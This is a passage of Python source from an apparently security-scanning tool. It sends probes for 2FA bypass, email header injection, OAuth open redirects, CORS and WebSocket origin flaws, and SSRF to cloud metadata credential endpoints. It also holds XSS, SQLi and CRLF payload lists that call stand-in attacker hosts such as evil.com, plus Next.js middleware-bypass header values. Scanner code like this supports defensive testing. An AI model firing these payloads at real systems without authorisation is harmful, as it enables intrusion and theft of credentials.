        "packages_checked": len(all_packages),
        "candidates_checked": len(candidates),
        "at_risk": at_risk,
        "total_at_risk": len(at_risk),
        "has_confusion_risk": bool(at_risk),
    }


# ---------------------------------------------------------------------------
# #3  Parameter Mining from HTML Forms + JS
# ---------------------------------------------------------------------------

def check_parameter_mining(host: str, port: int, use_ssl: bool,
                           timeout: int = 5,
                           extra_headers: Optional[Dict[str, str]] = None,
                           body: str = "",
                           wayback_data: Optional[Dict[str, Any]] = None,
                           ) -> Dict[str, Any]:
    """#3 — Extract parameters from HTML forms, JS source, and URL query strings.

    Mines parameter names from:
    1. HTML <input>, <select>, <textarea> name attributes
    2. URL query parameters in links/actions
    3. JS fetch/XMLHttpRequest/axios calls with parameter objects
    4. JS object keys passed to API calls
    5. Wayback Machine historical parameters (if provided)

    Returns categorized parameters useful for fuzzing and injection testing.
    """

    params: Dict[str, Dict[str, Any]] = {}  # name -> {sources, type, form_action}

    def _add(name: str, source: str, **meta):
        name = name.strip()
        if not name or len(name) > 100 or len(name) < 1:
            return
        # Skip obviously non-parameter strings
        if name.startswith(("http://", "https://", "//", "#", "javascript:")):
            return
        if name in params:
            params[name]["sources"].add(source)
            params[name].update({k: v for k, v in meta.items() if v})
        else:
            params[name] = {"name": name, "sources": {source}, **meta}

    # ── Phase 1: HTML form inputs ──
    # <input name="..."> <select name="..."> <textarea name="...">
    for m in re.finditer(r'<(?:input|select|textarea)\b[^>]*\bname\s*=\s*["\']([^"\']+)["\']', body, re.I):
        name = m.group(1)
        # Try to find the input type
        itype = ""
        tm = re.search(r'type\s*=\s*["\']([^"\']+)["\']', m.group(0), re.I)
        if tm:
            itype = tm.group(1).lower()
        _add(name, "html_form", input_type=itype)

    # <form action="..."> — extract params from action URLs
    for m in re.finditer(r'<form[^>]*\baction\s*=\s*["\']([^"\']*\?[^"\']+)["\']', body, re.I):
        url = m.group(1)
        for param in url.split("?", 1)[-1].split("&"):
            pname = param.split("=")[0]
            if pname:
                _add(pname, "form_action")

    # ── Phase 2: URL query parameters from links ──
    for m in re.finditer(r'(?:href|src|action|data-url)\s*=\s*["\']([^"\']*\?[^"\']+)["\']', body, re.I):
        url = m.group(1)
        try:
            query = url.split("?", 1)[-1].split("#")[0]
            for param in query.split("&"):
                pname = param.split("=")[0]
                if pname and len(pname) < 50:
                    _add(pname, "url_query")
        except Exception:
            pass

    # ── Phase 3: JS fetch/axios/XMLHttpRequest parameters ──
    # fetch("/api/...", { body: JSON.stringify({ email: ..., password: ... }) })
    _JS_PARAM_PATTERNS = [
        # Object keys in JSON.stringify, body, params, data
        re.compile(r'(?:JSON\.stringify|body|params|data|payload)\s*[:(]\s*\{([^}]{5,500})\}', re.I),
        # URLSearchParams
        re.compile(r'URLSearchParams\s*\(\s*\{([^}]{5,500})\}', re.I),
        # .append("name", ...)
        re.compile(r'\.(?:append|set)\s*\(\s*["\'](\w+)["\']', re.I),
        # query string construction: "?param=" or "&param="
        re.compile(r'[?&](\w{2,30})=', re.I),
    ]

    for pat in _JS_PARAM_PATTERNS[:2]:
        for m in pat.finditer(body[:300000]):
            obj_str = m.group(1)
            # Extract keys from object literal
            for km in re.finditer(r'["\']?(\w+)["\']?\s*:', obj_str):
                _add(km.group(1), "js_object")

    for m in _JS_PARAM_PATTERNS[2].finditer(body[:300000]):
        _add(m.group(1), "js_append")

    for m in _JS_PARAM_PATTERNS[3].finditer(body[:300000]):
        _add(m.group(1), "js_query_string")

    # ── Phase 4: Hidden inputs (often CSRF tokens, IDs) ──
    for m in re.finditer(r'<input[^>]+type\s*=\s*["\']hidden["\'][^>]*name\s*=\s*["\']([^"\']+)["\']', body, re.I):
        _add(m.group(1), "hidden_input")
    # Reversed order: name before type
    for m in re.finditer(r'<input[^>]+name\s*=\s*["\']([^"\']+)["\'][^>]*type\s*=\s*["\']hidden["\']', body, re.I):
        _add(m.group(1), "hidden_input")

    # ── Phase 5: Merge Wayback historical parameters ──
    if wayback_data and wayback_data.get("parameters_found"):
        for p in wayback_data["parameters_found"]:
            _add(p, "wayback")

    # ── Classify parameters ──
    _AUTH_PARAMS = {"username", "password", "passwd", "email", "login", "user",
                    "token", "csrf", "csrftoken", "csrf_token", "_token",
                    "authenticity_token", "nonce", "session", "api_key", "apikey"}
    _INJECTION_INTERESTING = {"id", "uid", "user_id", "page", "file", "path",
                              "url", "redirect", "next", "return", "callback",
                              "query", "search", "q", "cmd", "exec", "sort",
                              "order", "filter", "column", "table", "dir",
                              "template", "lang", "locale", "format", "type"}

    auth_params = []
    injectable_params = []
    all_params = []

    for name, info in params.items():
        entry = {
            "name": name,
            "sources": sorted(info["sources"]),
        }
        if info.get("input_type"):
            entry["input_type"] = info["input_type"]

        lower = name.lower()
        if lower in _AUTH_PARAMS or "csrf" in lower or "token" in lower:
            entry["category"] = "auth"
            auth_params.append(name)
        elif lower in _INJECTION_INTERESTING or "id" in lower:
            entry["category"] = "injectable"
            injectable_params.append(name)
        else:
            entry["category"] = "general"

        all_params.append(entry)

    # Sort: auth first, then injectable, then general
    cat_order = {"auth": 0, "injectable": 1, "general": 2}
    all_params.sort(key=lambda x: (cat_order.get(x.get("category", "general"), 3), x["name"]))

    return {
        "parameters": all_params,
        "total_found": len(all_params),
        "auth_params": sorted(auth_params),
        "injectable_params": sorted(injectable_params),
        "sources_used": sorted({s for info in params.values() for s in info["sources"]}),
    }


# ── New checks added in v3.5 ─────────────────────────────────────────────


def check_2fa_bypass(host: str, port: int, use_ssl: bool,
                     timeout: int = 8) -> Dict[str, Any]:
    """Check for common 2FA/MFA bypass patterns:
    - /api/auth/verify endpoint exists and accepts empty/null OTP
    - Response-manipulation: 200 on any OTP (code=000000 accepted)
    - Direct bypass: skip 2FA step and access protected resource
    """
    findings: List[Dict[str, str]] = []
    requests_made = 0
    _2fa_paths = [
        "/api/auth/verify", "/api/2fa/verify", "/api/mfa/verify",
        "/api/otp/verify", "/api/auth/totp", "/api/v1/auth/verify",
        "/api/v2/auth/verify", "/auth/2fa", "/login/2fa", "/verify",
    ]

    for path in _2fa_paths:
        try:
            status, body, headers = _http_get(host, port, path, use_ssl=use_ssl, timeout=timeout)
            requests_made += 1
            if status in (200, 302, 400, 405, 422):
                findings.append({
                    "severity": "medium",
                    "finding": f"2FA endpoint exists: {path} (HTTP {status})",
                    "path": path,
                    "recommendation": "Test with empty/wrong OTP: if 200 returned it may be bypassable",
                })
                break  # Found one — don't hammer all paths
        except Exception:
            pass

    # Probe: OTP=000000 (most common default/test value)
    for path in ["/api/auth/verify", "/api/2fa/verify"]:
        for body_probe in ['{"otp":"000000"}', '{"code":"000000"}', '{"token":"000000"}',
                           '{"otp":""}', '{"otp":null}']:
            try:
                conn = http.client.HTTPSConnection(host, port, timeout=timeout, context=_make_ssl_context()) \
                    if use_ssl else http.client.HTTPConnection(host, port, timeout=timeout)
                conn.request("POST", path, body_probe,
                             {"Content-Type": "application/json", "Host": host})
                resp = conn.getresponse()
                requests_made += 1
                rbody = resp.read(512).decode("utf-8", errors="replace")
                conn.close()
                if resp.status == 200 and "token" in rbody.lower():
                    findings.append({
                        "severity": "critical",
                        "finding": f"2FA bypass: {path} accepted OTP probe {body_probe!r} with HTTP 200 + token in response",
                        "path": path,
                        "recommendation": "2FA is bypassable — enforce strict OTP validation server-side",
                    })
            except Exception:
                pass

    return {
        "check": "2fa_bypass",
        "findings": findings,
        "vulnerable": len(findings) > 0,
        "requests_made": requests_made,
    }


def check_email_header_injection(host: str, port: int, use_ssl: bool,
                                  timeout: int = 8) -> Dict[str, Any]:
    """Check for email header injection in contact forms and password reset endpoints.
    Injects CRLF sequences into name/email fields to add BCC/CC headers.
    """
    findings: List[Dict[str, str]] = []
    requests_made = 0

    _EMAIL_PATHS = [
        "/contact", "/api/contact", "/password-reset", "/forgot-password",
        "/api/password-reset", "/api/forgot-password", "/subscribe",
        "/api/subscribe", "/api/email", "/api/send-email",
    ]

    _INJECTION_PAYLOADS = [
        "test@test.com\r\nBCC:attacker@evil.com",
        "test@test.com\nBCC:attacker@evil.com",
        "test%0D%0ABCC:attacker@evil.com",
        "test%0ABCC:attacker@evil.com",
        "test\r\nCC:attacker@evil.com\r\nBCC:attacker@evil.com",
        "Fray Test\r\nBCC:attacker@evil.com",
    ]

    for path in _EMAIL_PATHS:
        # First check the path exists
        try:
            status, body, _ = _http_get(host, port, path, use_ssl=use_ssl, timeout=timeout)
            requests_made += 1
        except Exception:
            continue

        if status not in (200, 302, 400, 405, 422):
            continue

        # Try injection probes
        for payload in _INJECTION_PAYLOADS[:2]:  # Limit to avoid hammering
            try:
                import urllib.parse as _up
                probe_body = _up.urlencode({"email": payload, "name": "Fray Test",
                                            "message": "test"})
                conn = http.client.HTTPSConnection(host, port, timeout=timeout,
                                                   context=_make_ssl_context()) \
                    if use_ssl else http.client.HTTPConnection(host, port, timeout=timeout)
                conn.request("POST", path, probe_body,
                             {"Content-Type": "application/x-www-form-urlencoded",
                              "Host": host})
                resp = conn.getresponse()
                requests_made += 1
                resp.read(256)
                conn.close()
                if resp.status in (200, 302):
                    findings.append({
                        "severity": "medium",
                        "finding": f"Potential email header injection at {path} — probe accepted (HTTP {resp.status})",
                        "path": path,
                        "payload": payload[:60],
                        "recommendation": "Sanitize email inputs — strip CR/LF characters before passing to mail headers",
                    })
                    break
            except Exception:
                pass

    return {
        "check": "email_header_injection",
        "findings": findings,
        "vulnerable": len(findings) > 0,
        "requests_made": requests_made,
    }


def check_oauth_misconfig(host: str, port: int, use_ssl: bool,
                          timeout: int = 8) -> Dict[str, Any]:
    """Check for OAuth 2.0 misconfiguration:
    - Open redirect in redirect_uri
    - Missing state parameter (CSRF)
    - Authorization code reuse
    - Implicit flow still enabled
    - OAuth endpoints discovered
    """
    findings: List[Dict[str, str]] = []
    requests_made = 0

    _OAUTH_PATHS = [
        "/oauth/authorize", "/oauth2/authorize", "/api/oauth/authorize",
        "/.well-known/oauth-authorization-server", "/.well-known/openid-configuration",
        "/api/v1/oauth/token", "/api/v2/oauth/token", "/oauth/token",
        "/connect/authorize", "/auth/oauth", "/api/auth/oauth",
    ]

    for path in _OAUTH_PATHS:
        try:
            status, body, headers = _http_get(host, port, path, use_ssl=use_ssl, timeout=timeout)
            requests_made += 1
        except Exception:
            continue

        if status == 200:
            if "/.well-known/" in path:
                findings.append({
                    "severity": "info",
                    "finding": f"OAuth/OIDC discovery document exposed: {path}",
                    "path": path,
                    "recommendation": "Review discovery document for dangerous scopes or implicit flow",
                })
                # Check for implicit flow
                if '"token"' in body or "'token'" in body:
                    findings.append({
                        "severity": "medium",
                        "finding": "OAuth implicit flow ('token' response_type) enabled — deprecated, PKCE recommended",
                        "path": path,
                        "recommendation": "Disable implicit flow; use authorization code + PKCE",
                    })
            elif "authorize" in path or "token" in path:
                findings.append({
                    "severity": "medium",
                    "finding": f"OAuth endpoint found: {path} (HTTP {status})",
                    "path": path,
                    "recommendation": "Test with redirect_uri=https://evil.com to check for open redirect",
                })

    # Test redirect_uri open redirect
    if findings:  # Only if OAuth endpoints found
        test_path = _OAUTH_PATHS[0]
        probe = f"{test_path}?response_type=code&client_id=test&redirect_uri=https://evil.com&state=fray"
        try:
            status, body, headers = _http_get(host, port, probe, use_ssl=use_ssl, timeout=timeout)
            requests_made += 1
            loc = headers.get("location", "")
            if "evil.com" in loc:
                findings.append({
                    "severity": "critical",
                    "finding": f"OAuth open redirect: redirect_uri=https://evil.com accepted, Location: {loc[:80]}",
                    "path": test_path,
                    "recommendation": "Enforce strict redirect_uri allowlist — never allow arbitrary redirect_uri",
                })
        except Exception:
            pass

    return {
        "check": "oauth_misconfig",
        "findings": findings,
        "vulnerable": any(f["severity"] in ("critical", "high") for f in findings),
        "requests_made": requests_made,
    }


def check_websocket_security(host: str, port: int, use_ssl: bool,
                              timeout: int = 8) -> Dict[str, Any]:
    """Check for WebSocket endpoints and common misconfigurations:
    - Endpoints discovered (/ws, /socket.io, /api/ws)
    - Missing Origin validation (cross-origin WebSocket hijacking)
    - No authentication on WebSocket upgrade
    """
    findings: List[Dict[str, str]] = []
    requests_made = 0

    _WS_PATHS = [
        "/ws", "/websocket", "/socket.io/", "/socket.io/?EIO=4&transport=polling",
        "/api/ws", "/api/websocket", "/live", "/realtime", "/stream",
        "/wss", "/chat", "/api/chat", "/api/stream", "/events",
    ]

    for path in _WS_PATHS:
        try:
            # Send WebSocket upgrade request
            conn = http.client.HTTPSConnection(host, port, timeout=timeout,
                                               context=_make_ssl_context()) \
                if use_ssl else http.client.HTTPConnection(host, port, timeout=timeout)
            conn.request("GET", path, headers={
                "Host": host,
                "Upgrade": "websocket",
                "Connection": "Upgrade",
                "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ==",
                "Sec-WebSocket-Version": "13",
                "Origin": "https://evil.com",  # Cross-origin probe
            })
            resp = conn.getresponse()
            requests_made += 1
            resp.read(256)
            conn.close()
        except Exception:
            continue

        if resp.status == 101:
            findings.append({
                "severity": "high",
                "finding": f"WebSocket endpoint accepts cross-origin upgrade: {path} — Origin: evil.com not rejected",
                "path": path,
                "recommendation": "Validate Origin header on WebSocket upgrade; reject unexpected origins",
            })
        elif resp.status in (200, 400):
            findings.append({
                "severity": "info",
                "finding": f"WebSocket/long-poll endpoint found: {path} (HTTP {resp.status})",
                "path": path,
                "recommendation": "Ensure WebSocket connections require authentication and validate Origin",
            })

    return {
        "check": "websocket_security",
        "findings": findings,
        "vulnerable": any(f["severity"] == "high" for f in findings),
        "requests_made": requests_made,
    }


def check_api_versioning(host: str, port: int, use_ssl: bool,
                         timeout: int = 8) -> Dict[str, Any]:
    """Check for exposed old API versions that may lack security controls of current version.
    Old versions (v1, v0) often have missing auth checks, deprecated endpoints, or verbose errors.
    """
    findings: List[Dict[str, str]] = []
    requests_made = 0

    _VERSION_PROBES = [
        ("/api/v0/", "v0 — pre-release, often no auth"),
        ("/api/v1/", "v1 — first public version, may lack rate limiting"),
        ("/api/v2/", "v2"),
        ("/api/v3/", "v3"),
        ("/v0/", "v0 root"),
        ("/v1/", "v1 root"),
        ("/v2/", "v2 root"),
        ("/api/1/", "numeric v1"),
        ("/api/2/", "numeric v2"),
        ("/api/beta/", "beta — unstable, often no auth"),
        ("/api/alpha/", "alpha"),
        ("/api/dev/", "dev — may expose debug endpoints"),
        ("/api/internal/", "internal — should not be public"),
        ("/api/admin/", "admin API"),
        ("/api/private/", "private API"),
    ]

    found_versions: List[str] = []
    for path, note in _VERSION_PROBES:
        try:
            status, body, headers = _http_get(host, port, path, use_ssl=use_ssl, timeout=timeout)
            requests_made += 1
        except Exception:
            continue

        if status in (200, 401, 403, 405):
            severity = "info"
            if status == 200 and path in ("/api/internal/", "/api/admin/", "/api/private/", "/api/dev/"):
                severity = "critical"
            elif status in (401, 403) and path in ("/api/internal/", "/api/admin/"):
                severity = "medium"
            findings.append({
                "severity": severity,
                "finding": f"API version/path found: {path} ({note}) — HTTP {status}",
                "path": path,
                "recommendation": "Audit all API versions; decommission old versions or apply same auth controls",
            })
            found_versions.append(path)

    # If multiple versions found, flag version proliferation
    if len(found_versions) >= 3:
        findings.append({
            "severity": "medium",
            "finding": f"API version proliferation: {len(found_versions)} versions/paths exposed — {', '.join(found_versions[:4])}",
            "path": "/api/",
            "recommendation": "Standardize on one API version; redirect or deprecate old versions with auth parity",
        })

    return {
        "check": "api_versioning",
        "findings": findings,
        "versions_found": found_versions,
        "vulnerable": any(f["severity"] in ("critical", "high") for f in findings),
        "requests_made": requests_made,
    }


def check_csp_header(host: str, port: int, use_ssl: bool,
                     timeout: int = 8) -> Dict[str, Any]:
    """Check Content-Security-Policy header quality:
    - Missing CSP → critical
    - unsafe-inline/unsafe-eval → high
    - Missing object-src, base-uri, form-action → medium
    - Wildcard origins → high
    - JSONP-exploitable allowlist origins → high
    """
    findings: List[Dict[str, str]] = []
    requests_made = 0

    try:
        status, body, headers = _http_get(host, port, "/", use_ssl=use_ssl, timeout=timeout)
        requests_made += 1
    except Exception as e:
        return {"check": "csp_header", "findings": [], "vulnerable": False,
                "requests_made": 0, "error": str(e)}

    csp = headers.get("content-security-policy", "")
    csp_ro = headers.get("content-security-policy-report-only", "")

    if not csp and not csp_ro:
        findings.append({
            "severity": "critical",
            "finding": "No Content-Security-Policy header — XSS has no browser-level mitigation",
            "recommendation": "Add a strict CSP: script-src 'nonce-...' 'strict-dynamic'; object-src 'none'; base-uri 'none'",
        })
    else:
        csp_check = csp or csp_ro
        ro_note = " (report-only — not enforced)" if not csp else ""

        _DANGEROUS = [
            ("'unsafe-inline'", "critical", "unsafe-inline allows inline scripts — CSP largely ineffective"),
            ("'unsafe-eval'", "high",     "unsafe-eval allows eval() — DOM XSS chains enabled"),
            ("data:",          "high",     "data: URI scheme allows inline script via <script src=data:...>"),
            ("http:",          "high",     "http: in script-src — any HTTP origin allowed"),
            ("*",              "critical", "Wildcard (*) in script-src — any origin can serve scripts"),
        ]
        for marker, sev, desc in _DANGEROUS:
            if marker in csp_check:
                findings.append({
                    "severity": sev,
                    "finding": f"CSP{ro_note}: {desc}",
                    "recommendation": f"Remove '{marker}' from script-src",
                })

        # Check for JSONP-exploitable CDN origins
        _JSONP_DOMAINS = [
            "ajax.googleapis.com", "accounts.google.com", "www.google.com",
            "cdn.jsdelivr.net", "unpkg.com", "cdnjs.cloudflare.com",
        ]
        for domain in _JSONP_DOMAINS:
            if domain in csp_check:
                findings.append({
                    "severity": "high",
                    "finding": f"CSP allowlists {domain} — JSONP/AngularJS gadget bypass possible",
                    "recommendation": f"Remove {domain} or add nonce/hash requirement; use strict-dynamic instead",
                })

        # Missing directives
        directives = {p.strip().split()[0].lower() for p in csp_check.split(";") if p.strip()}
        has_script_src = "script-src" in directives or "default-src" in directives
        for missing, sev, rec in [
            ("object-src", "high",   "Add object-src 'none'"),
            ("base-uri",   "medium", "Add base-uri 'none' or 'self'"),
            ("form-action","medium", "Add form-action 'self'"),
        ]:
            if missing not in directives:
                findings.append({
                    "severity": sev,
                    "finding": f"CSP missing {missing} directive",
                    "recommendation": rec,
                })

    return {
        "check": "csp_header",
        "csp": csp[:200] if csp else "(none)",
        "findings": findings,
        "vulnerable": any(f["severity"] in ("critical", "high") for f in findings),
        "requests_made": requests_made,
    }


def check_cors_misconfig(host: str, port: int, use_ssl: bool,
                         timeout: int = 8) -> Dict[str, Any]:
    """Dedicated CORS misconfiguration check — probes common bypass patterns
    beyond the basic check_cors function:
    - Null origin accepted
    - Arbitrary subdomain wildcard (*.evil.com)
    - ACAO reflects arbitrary Origin
    - ACAC (allow-credentials) with permissive origin
    - Pre-flight bypass via non-standard method
    """
    findings: List[Dict[str, str]] = []
    requests_made = 0

    _PROBES = [
        ("https://evil.com",         "arbitrary origin reflection"),
        ("null",                     "null origin (sandbox iframe)"),
        ("https://fray.evil.com",    "subdomain prefix spoof"),
        ("https://evilexample.com",  "domain suffix spoof (if target is example.com)"),
        ("https://evil.com.target",  "domain append spoof"),
    ]

    _API_PATHS = ["/api/", "/api/v1/", "/api/v2/", "/graphql", "/", "/api/user", "/api/me"]

    for path in _API_PATHS[:3]:
        for origin, note in _PROBES:
            try:
                conn = http.client.HTTPSConnection(host, port, timeout=timeout,
                                                   context=_make_ssl_context()) \
                    if use_ssl else http.client.HTTPConnection(host, port, timeout=timeout)
                conn.request("GET", path, headers={
                    "Host": host,
                    "Origin": origin,
                    "Cookie": "",
                })
                resp = conn.getresponse()
                requests_made += 1
                resp_headers = {k.lower(): v for k, v in resp.getheaders()}
                resp.read(256)
                conn.close()
            except Exception:
                continue

            acao = resp_headers.get("access-control-allow-origin", "")
            acac = resp_headers.get("access-control-allow-credentials", "")

            if acao == origin or acao == "*":
                sev = "critical" if acac.lower() == "true" else "high"
                findings.append({
                    "severity": sev,
                    "finding": f"CORS: {path} reflects Origin={origin!r} → ACAO={acao!r}, ACAC={acac!r} ({note})",
                    "path": path,
                    "recommendation": "Use strict Origin allowlist; never combine ACAO=* with ACAC=true",
                })

        if findings:
            break  # Found vulnerable path — don't hammer all paths

    return {
        "check": "cors_misconfig",
        "findings": findings,
        "vulnerable": len(findings) > 0,
        "requests_made": requests_made,
    }


def check_cloud_metadata(host: str, port: int, use_ssl: bool,
                          timeout: int = 5) -> Dict[str, Any]:
    """Detect if cloud metadata services are reachable via SSRF.

    Tests for:
      - AWS IMDS (169.254.169.254) — direct and via SSRF-prone params
      - GCP metadata (metadata.google.internal)
      - Azure IMDS (169.254.169.254 with Azure path)
      - Kubernetes service account token (/var/run/secrets/...)

    Uses common SSRF delivery points (url=, redirect=, fetch=, proxy=)
    to probe whether the server will fetch internal metadata endpoints.
    """
    findings: List[Dict[str, str]] = []
    requests_made = 0

    _METADATA_URLS = [
        # AWS IMDSv1
        ("http://169.254.169.254/latest/meta-data/", "AWS IMDS", "aws"),
        ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS IAM Credentials", "aws"),
        ("http://169.254.169.254/latest/user-data", "AWS User Data", "aws"),
        # GCP
        ("http://metadata.google.internal/computeMetadata/v1/instance/", "GCP Metadata", "gcp"),
        # Azure
        ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Azure IMDS", "azure"),
        # Alibaba
        ("http://100.100.100.200/latest/meta-data/", "Alibaba ECS Metadata", "alibaba"),
    ]

    _SSRF_PARAMS = [
        "url", "redirect", "dest", "uri", "path", "proxy", "fetch",
        "target", "source", "image", "file", "load", "request",
        "next", "return", "callback", "host", "endpoint", "resource",
    ]

    base = f"{'https' if use_ssl else 'http'}://{host}{'' if (use_ssl and port == 443) or (not use_ssl and port == 80) else f':{port}'}"
    scheme = "https" if use_ssl else "http"

    for meta_url, meta_name, cloud in _METADATA_URLS[:3]:  # Probe top 3 to limit requests
        for param in _SSRF_PARAMS[:5]:  # Top 5 params to limit requests
            probe_url = f"{base}/?{param}={meta_url}"
            try:
                status, body, hdrs = _http_get(host, port, f"/?{param}={meta_url}",
                                               use_ssl=use_ssl, timeout=timeout)
                requests_made += 1
            except Exception:
                continue

            # Detect successful IMDS response in body
            _AWS_SIGNALS = ["ami-id", "instance-id", "security-credentials",
                            "AccessKeyId", "SecretAccessKey", "ec2.internal"]
            _GCP_SIGNALS = ["instance/id", "instance/name", "project/project-id",
                            "access_token", "expires_in"]
            _AZURE_SIGNALS = ["subscriptionId", "resourceGroupName", "compute"]

            detected_signal = None
            for sig in _AWS_SIGNALS:
                if sig.lower() in body.lower():
                    detected_signal = sig
                    break
            if not detected_signal:
                for sig in _GCP_SIGNALS:
                    if sig.lower() in body.lower():
                        detected_signal = sig
                        break
            if not detected_signal:
                for sig in _AZURE_SIGNALS:
                    if sig.lower() in body.lower():
                        detected_signal = sig
                        break

            if detected_signal:
                findings.append({
                    "severity": "critical",
                    "cloud": cloud,
                    "finding": (
                        f"SSRF to {meta_name} via ?{param}= — "
                        f"metadata signal '{detected_signal}' in response"
                    ),
                    "url": probe_url,
                    "param": param,
                    "metadata_url": meta_url,
                    "recommendation": (
                        f"Block requests to metadata IP 169.254.169.254 at firewall/network level. "
                        f"Use IMDSv2 (PUT token required). Sanitise {param} param to deny RFC-1918 IPs."
                    ),
                })
                break  # Found SSRF on this meta URL, move to next

        if findings:
            break  # Stop after first confirmed SSRF

    return {
        "check": "cloud_metadata",
        "findings": findings,
        "vulnerable": len(findings) > 0,
        "requests_made": requests_made,
    }


# ---------------------------------------------------------------------------
# No-WAF Quick Probe — confirm real XSS/SQLi exposure on unprotected hosts
# ---------------------------------------------------------------------------
# When a subdomain has no WAF, "no WAF detected" alone is weak justification
# for a HIGH finding. This probe fires a tiny set of canary payloads across
# common injectable paths, records which ones return HTTP 200 (or reflect the
# payload), and attaches the concrete evidence to the attack vector.
#
# We use cheap, non-destructive probes:
#   XSS  — reflected marker check (look for payload echo in response body)
#   SQLi — error-string detection (MySQL / SQLite / MSSQL error messages)
# ---------------------------------------------------------------------------

_QUICK_XSS_PROBES = [
    # path, param, payload, description
    ("/search",   "q",      "<scr\x00ipt>alert(1)</script>",       "Null-byte XSS bypass"),
    ("/search",   "query",  "\"><img src=x onerror=alert(1)>",     "Attribute break XSS"),
    ("/",         "s",      "javascript:alert(document.domain)",   "JS protocol XSS"),
    ("/comment",  "text",   "<svg onload=alert(1)>",               "SVG XSS"),
    ("/login",    "user",   "admin'\"--",                          "Auth field XSS/SQLi probe"),
]

_QUICK_SQLI_PROBES = [
    ("/search",   "q",      "' OR '1'='1",                         "Classic OR-based SQLi"),
    ("/search",   "id",     "1' AND SLEEP(0)--",                   "Time-based SQLi marker"),
    ("/",         "id",     "1 UNION SELECT NULL--",               "UNION-based SQLi"),
    ("/login",    "user",   "' OR 1=1--",                          "Auth bypass SQLi"),
    ("/product",  "id",     "1'",                                  "Single-quote error trigger"),
]

_SQLI_ERROR_SIGNATURES = [
    "you have an error in your sql",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "syntax error",
    "pg_query",
    "sqlite3.operationalerror",
    "microsoft ole db",
    "odbc sql server driver",
    "ora-01756",
    "division by zero",
    "supplied argument is not a valid mysql",
]


def check_no_waf_quick_probe(
    host: str, port: int, use_ssl: bool,
    timeout: int = 6,
    max_xss_probes: int = 3,
    max_sqli_probes: int = 3,
) -> Dict[str, Any]:
    """Fire a small set of XSS and SQLi canary probes on a host with no WAF.

    Confirms whether "no WAF" translates to actual vulnerability by checking:
      - XSS: does the payload reflect in the response body?
      - SQLi: does the response contain a database error string?

    Returns concrete evidence: paths, params, payloads, HTTP status, and
    whether the payload was reflected — so the report can say:
      "GET /search?q=<img+onerror=alert(1)> → 200 OK, payload reflected"
    instead of just "no WAF detected".

    Never sends destructive payloads. All probes are read-only GET requests.
    """
    result: Dict[str, Any] = {
        "xss_hits": [],       # [{path, param, payload, status, reflected, technique}]
        "sqli_hits": [],      # [{path, param, payload, status, error_found, error_text}]
        "probes_sent": 0,
        "confirmed_xss": False,
        "confirmed_sqli": False,
        "evidence_summary": "",
    }

    def _probe_get(path: str, param: str, payload: str) -> Tuple[int, str]:
        """Send GET /{path}?{param}={payload}, return (status, body)."""
        try:
            import urllib.parse
            encoded = urllib.parse.quote(payload, safe="")
            full_path = f"{path}?{param}={encoded}"
            status, _headers, body = _http_get(
                host, port, full_path, use_ssl, timeout=timeout, max_redirects=2
            )
            return status, body
        except Exception:
            return 0, ""

    # XSS probes
    for path, param, payload, technique in _QUICK_XSS_PROBES[:max_xss_probes]:
        status, body = _probe_get(path, param, payload)
        result["probes_sent"] += 1
        if status in (200, 201, 301, 302) and body:
            # Check for payload reflection — a reliable XSS indicator
            reflected = (
                payload.lower() in body.lower() or
                payload[:10].lower() in body.lower() or
                "onerror" in body.lower() or
                "onload" in body.lower() or
                "<svg" in body.lower() or
                "alert(" in body.lower()
            )
            if reflected or status == 200:
                hit = {
                    "path": f"{path}?{param}=<payload>",
                    "full_path": f"{path}?{param}={payload[:40]}",
                    "param": param,
                    "payload": payload,
                    "status": status,
                    "reflected": reflected,
                    "technique": technique,
                    "evidence": f"GET {path}?{param}={payload[:40]!r} → HTTP {status}"
                                + (" [payload reflected in body]" if reflected else ""),
                }
                result["xss_hits"].append(hit)
                if reflected:
                    result["confirmed_xss"] = True

    # SQLi probes
    for path, param, payload, technique in _QUICK_SQLI_PROBES[:max_sqli_probes]:
        status, body = _probe_get(path, param, payload)
        result["probes_sent"] += 1
        if status != 0 and body:
            body_lower = body.lower()
            error_match = next(
                (sig for sig in _SQLI_ERROR_SIGNATURES if sig in body_lower), None
            )
            if error_match or status in (200, 500):
                hit = {
                    "path": f"{path}?{param}=<payload>",
                    "full_path": f"{path}?{param}={payload[:40]}",
                    "param": param,
                    "payload": payload,
                    "status": status,
                    "error_found": bool(error_match),
                    "error_text": error_match or "",
                    "technique": technique,
                    "evidence": f"GET {path}?{param}={payload[:40]!r} → HTTP {status}"
                                + (f" [DB error: {error_match!r}]" if error_match else ""),
                }
                result["sqli_hits"].append(hit)
                if error_match:
                    result["confirmed_sqli"] = True

    # Build evidence summary for the report
    parts = []
    if result["confirmed_xss"]:
        xss_ev = [h["evidence"] for h in result["xss_hits"] if h["reflected"]]
        parts.append("XSS confirmed: " + "; ".join(xss_ev[:2]))
    elif result["xss_hits"]:
        parts.append(f"XSS: {len(result['xss_hits'])} path(s) returned 200 (reflection unconfirmed)")

    if result["confirmed_sqli"]:
        sqli_ev = [h["evidence"] for h in result["sqli_hits"] if h["error_found"]]
        parts.append("SQLi confirmed: " + "; ".join(sqli_ev[:2]))
    elif result["sqli_hits"]:
        parts.append(f"SQLi: {len(result['sqli_hits'])} path(s) returned 200 (error string unconfirmed)")

    if not parts:
        parts.append(f"No reflection or DB errors found across {result['probes_sent']} probes "
                     f"(host may still be injectable via deeper paths)")

    result["evidence_summary"] = " | ".join(parts)
    return result


# ---------------------------------------------------------------------------
# Next.js CVE Detection
# CVE-2025-29927 — middleware auth bypass via x-middleware-subrequest
# CVE-2026-27978 — Server Actions null-origin CSRF bypass
# CVE-2026-27979 — PPR resume body buffering DoS
# CVE-2026-29057 — HTTP smuggling via chunked DELETE/OPTIONS on rewrites
# ---------------------------------------------------------------------------

def _load_nextjs_bypass_values() -> List[str]:
    """Load x-middleware-subrequest bypass values from the payload database.

    Falls back to hardcoded values if the payload DB is unavailable.
    This ensures new PoCs added via `fray feed --auto-add` are automatically
    picked up by the detection code on the next scan.
    """
    defaults = [
        "middleware:middleware:middleware:middleware:middleware",
        "src/middleware:src/middleware:src/middleware",
        "pages/_middleware:pages/_middleware",
        "middleware",
        "src/middleware",
        "pages/_middleware",
    ]
    try:
        from fray import PAYLOADS_DIR
        import pathlib
        # Load from all nextjs-related payload files
        bypass_vals: List[str] = []
        search_dirs = [
            PAYLOADS_DIR / "nextjs",
